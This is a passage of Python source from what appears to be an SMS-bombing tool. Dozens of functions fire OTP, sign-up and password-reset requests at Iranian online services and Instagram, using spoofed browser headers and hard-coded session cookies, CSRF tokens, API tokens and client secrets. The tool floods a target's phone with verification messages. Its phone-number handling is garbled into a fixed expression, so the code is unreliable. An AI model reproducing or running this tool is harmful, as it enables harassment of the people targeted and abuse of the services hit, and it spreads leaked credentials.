        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa_IR','client-v': '6.6.21','content-length': '43','content-type': 'application/json','devicetype': 'Windows','f-lang': 'fa','f-ses-id': 'ef807c51-7078-4711-81d5-c17b910c6fe5','origin': 'https://app.flightio.com','referer': 'https://app.flightio.com/profile/editprofile','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://app.flightio.com/bff/Authentication/CheckUserKey",json=n4, headers=rhead)
            return True
        except:
            pass

    def foodcenter(phone):
        #کد رو توی ریسپانس برمیگردونه
        n4 = f"mobile=0{('+90')[1]}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '138','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'FoodCity=kerman; __RequestVerificationToken=D4Xu-vyYOCqUz452OuzRFF1I_emQKm9byKT-VoABTIvDQ64wdL0FgwOxYmomz0VqlQzrPZVCgmzR3p8pBcZ54LZOwW01; ASP.NET_SessionId=5ycedcmb1ajoyctm2rw10ngf; KermanFoodUser=3cfccd41-4190-4f43-a37e-e42ffb586f0a; _ga_Q4305YKJE9=GS1.1.1660661382.1.0.1660661382.0; _ga=GA1.2.388015118.1660661383; _gid=GA1.2.1767121615.1660661384; _hjSessionUser_2820584=eyJpZCI6IjRhNzM5M2Y2LWFiNTAtNWI1ZS1hMTUxLTcyOTJhNGFjMDk3NiIsImNyZWF0ZWQiOjE2NjA2NjEzODQ3MDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2820584=eyJpZCI6IjYzMmNkYjJjLWU5MDAtNGM1MC1hM2Q3LTczMjY5NTM2NWJiYSIsImNyZWF0ZWQiOjE2NjA2NjEzODUyNjYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1','origin': 'https://www.foodcenter.ir','referer': 'https://www.foodcenter.ir/kerman/category/cafe?submenu=27','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://www.foodcenter.ir/account/sabtmobile",data=n4, headers=rhead)
            return True
        except:
            pass

    def shop_mci(phone):
        n4 = {"msisdn":('+90')[1]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
            return True
        except:
            pass

    def mci(phone):
        n4 = {"msisdn":('+90')[1]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '9f740bf9-817a-4539-bb1d-43790fc93b75','content-length': '23','content-type': 'application/json','origin': 'https://pwa.mci.ir','referer': 'https://pwa.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
            return True
        except:
            pass

    def hamrahbours(phone):
        n4 = {"MobileNumber":"0"+('+90')[1]}
        rhead = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b','authorization': 'Bearer undefined','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.hbbs.ir','origin': 'https://app.hbbs.ir','referer': 'https://app.hbbs.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.hbbs.ir/authentication/SendCode",json=n4, headers=rhead)
            return True
        except:
            pass

    def homtick(phone):
        n4 = {"mobileOrEmail":"0"+('+90')[1],"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://auth.homtick.com/api/V1/User/GetVerifyCode",json=n4, headers=rhead)
            return True
        except:
            pass

    def iranamlaak(phone):
        n4 = {"AgencyMobile":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",json=n4, headers=rhead)
            return True
        except:
            pass

    def karchidari(phone):
        n4 = {"mobile":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.kcd.app/api/v1/auth/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def kardoon(phone):
        n4 = {"optype":15,"userid":0,"mobile":"0"+('+90')[1],"firstname":"","lastname":"","cityid":0,"email":"","birthdate":"","gender":False,"avatarid":0,"packagename":"","versioncode":-1,"tokenkey":"","username":"","password":"","connectionname":"MainConStr"}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://app.kardoon.ir:4433/api/users",json=n4, headers=rhead)
            return True
        except:
            pass

    def mazoo(phone):
        n4 = {"phone":('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://mazoocandle.ir/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def ostadkr(phone):
        n4 = {"mobile":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.ostadkr.com/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def paymishe(phone):
        n4 = {"mobile":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
            return True
        except:
            pass

    def nesengrill(phone):
        n4 = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
        except:
            pass

    def sizdah50(phone):
        n4 = {"apiToken":"BYE7T3P73xwG8KKjUemqnpmtfi3CFKHt00w92hlBpGODB4dta45Z6qtVwUbvAM1s","clientSecret":"DJXBtleZru9SVf9uVnoG63E2I6dxzvkB","device":"web","username":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
        except:
            pass

            
    def zerocafe(phone):
        n4 = {"apiToken":"DBpPbfB2X7ZTnSyrugfKWuLoDbjn5VXAPgqVengvZznDEWoJV0y6x4GS1AL06Y7B","clientSecret":"51NZdnUk0cJClzlQCpz0S9YwMM0Fx9t2","device":"web","username":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
        except:
            pass

    def podro(phone):
        n4 = {"username":('+90')[1],"otp_provider":"INTERNAL","profile":{"name":"","national_code":""},"companies":[{"name":"kljkjjhhjjhde66","slug":"kljkjjhhjjhde66"}]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer','connection': 'keep-alive','content-length': '158','content-type': 'application/json','host': 'api.podro.com','origin': 'https://shop.podro.com','referer': 'https://shop.podro.com/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.podro.com/back4front/accounts/register",json=n4, headers=rhead)
            return True
        except:
            pass

    def rayshomar(phone):
        n4 = f"MobileNumber=0{('+90')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','app-version': '2.0.6','content-length': '24','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','language': 'fa','origin': 'https://app.rayshomar.ir','os-type': 'webapp','referer': 'https://app.rayshomar.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.rayshomar.ir/api/Register/RegistrMobile",data=n4, headers=rhead)
            return True
        except:
            pass

    def refahtea(phone):
        n4 = f"action=refah_send_code&mobile=0{('+90')[1]}&security=c68b01b32a"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '61','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://refahtea.ir','referer': 'https://refahtea.ir/register/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

    def shahrhayejadid(phone):
        n4 = f"mobile=0{('+90')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '18','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_gid=GA1.2.1080945716.1660661403; _ga_Q8S46CK37V=GS1.1.1660661403.1.1.1660662187.0; _gat_gtag_UA_148737608_1=1; _ga=GA1.1.702864792.1660661403; XSRF-TOKEN=eyJpdiI6IkFqaEZnMUZtRFFWa2txM09LUUc1WWc9PSIsInZhbHVlIjoiRTJIMnNaaThCZ3pSdC9FRi9kTWxZNUlJSUVEUnJRWFhXRUZJR2IwN0pFV2Y5cDlUNWNvV09YeUcwSWJVbEtQQlFOVE5iWittdlVrckxhSCtYTTFKdk9QZHh4SjdsQlJ4aXlNQWxFSFRnMzg0MkppVHIvcDNVdGNwckdjUVJiOXUiLCJtYWMiOiIyMWI5YWE4NDFhOTEzMGY3OWI2ZjRhMjk3MWVjYzRkZGEyZmU3ZjQwM2JkNjE4MjIxNzRiNmFiNTYyNjNhMDYyIn0%3D; shahrhayejadid_session=eyJpdiI6IjNmWElNV2tCM1dzY3VYRS8xYzdSc1E9PSIsInZhbHVlIjoiYW5FaGNJN2Rhb0M4MlQvT1V5a2gwY0IyYjlKS2tSY2tpc0xXNnZPbnV0bDRKK0Z2b0o5SGI0NHBIN2syU1F5c0k5Wjg4YVRqTFR1RXpCU3NrSG5FNFJPM3A1bVB6YUZQanNrS2Y0S1poK1piZWxkVUtZYmFqazR4eDhrM0tTdWQiLCJtYWMiOiJlMDkxNWMxODU3M2FkZWUwYTk1NzM1NmM5ZWFiMDZmNTdlMjRkNDZkYTRjNjBmZmFhODcxOTdmYTQ0OTc0MTAzIn0%3D','origin': 'https://shahrhayejadid.com','referer': 'https://shahrhayejadid.com/login','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-csrf-token': 'oREBtfHBdXTuDytkhWwjwSY4gtWHnCJEfbBmAaPN','x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def snapp_drivers(phone):
        n4 = {'cellphone':'0'+('+90')[1]}
        rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
        try: 
            post(url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",json=n4, headers=rhead)
            return True
        except:
            pass
            
    def mamifood(phone):
        n4 = {'Phone':'0'+('+90')[1]}
        rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
        try: 
            post(url="https://mamifood.org/Registration.aspx/SendValidationCode",json=n4, headers=rhead)
            return True
        except:
            pass

            
    def uphone(phone):
        n4 = {"mobile":"0"+('+90')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://server.uphone.ir/api/v1/login/otp/request",data=n4, headers=rhead)
            return True
        except:
            pass


    def amoomilad(phone):
        n4 = {"Token":"5c486f96df46520d1e4d4a990515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+('+90')[1],"Helper":77942}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",json=n4, headers=rhead)
            return True
        except:
            pass
            
    def ashraafi(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo={('+90')[1]}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={('+90')[1]}&dig_otp=&dig_nounce=54dfdabe34"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '203','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://ashraafi.com','referer': 'https://ashraafi.com/login-register/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    
        try: 
            post(url="https://ashraafi.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
    def bandarazad(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '276','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://bandarazad.com','referer': 'https://bandarazad.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbandarazad.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://bandarazad.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def bazidone(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo={('+90')[1]}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{('+90')[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '229','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://bazidone.com','referer': 'https://bazidone.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbazidone.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://bazidone.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def bigtoys(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&digregscode2=%2B90&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '351','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://www.bigtoys.ir','referer': 'https://www.bigtoys.ir/?login=true&back=home&page=1','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
    def bitex24(phone):
        HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','lang': 'null','origin': 'https://admin.bitex24.com','referer': 'https://admin.bitex24.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try:
            get(url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{('+90')[1]}&dial_code=0", headers=HEADER)
        except:
            pass

            
    def candoosms(phone):
        n4 = f"action=send_sms&phone=0{('+90')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.candoosms.com','referer': 'https://www.candoosms.com/signup/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.candoosms.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def farsgraphic(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo={('+90')[1]}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B90&mobmail2=&digregcode=%2B90&digits_reg_mail={('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '413','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://farsgraphic.com','referer': 'https://farsgraphic.com/?login=true&page=1&redirect_to=https%3A%2F%2Ffarsgraphic.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://farsgraphic.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def glite(phone):
        n4 = f"action=logini_first&login=0{('+90')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.glite.ir','referer': 'https://www.glite.ir/user-login/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.glite.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def instagram(phone):
        n4 = f"email_or_username=%2B{('+')[1]}&recaptcha_challenge_field=&flow=&app_id=&source_account_id="
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '93','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/password/reset/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-asbd-id': '198387','x-csrftoken': 'Rrz9lCCmwSAiSQmLsGwURFlco3sYs1Rm','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '315e7d00695c','x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.instagram.com/accounts/account_recovery_send_ajax/",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def hemat(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B90&mobmail2=&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://shop.hemat-elec.ir','referer': 'https://shop.hemat-elec.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.hemat-elec.ir%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def kodakamoz(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B90&mobmail2=&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '554','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.kodakamoz.com','referer': 'https://www.kodakamoz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.kodakamoz.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def mipersia(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&digregscode2=%2B90&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '277','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://www.mipersia.com','referer': 'https://www.mipersia.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.mipersia.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.mipersia.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def novinbook(phone):
        n4 = f"phone=0{('+90')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def offch(phone):
        n4 = {"username":"0"+('+90')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.offch.com/auth/otp",json=n4, headers=rhead)
            return True
        except:
            pass

            
    def sibbazar(phone):
        liJ = {"username": "0"+('+90')[1]}
        liU = "https://sandbox.sibbazar.com/api/v1/user/invite"
        liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','content-length': ',26','origin': 'https://developer.sibbazar.com','referer': 'https://developer.sibbazar.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'}
        try:
            post(url=liU, headers=liH, json=liJ)    
            return True    
        except:
            pass

            
    def raminashop(phone):
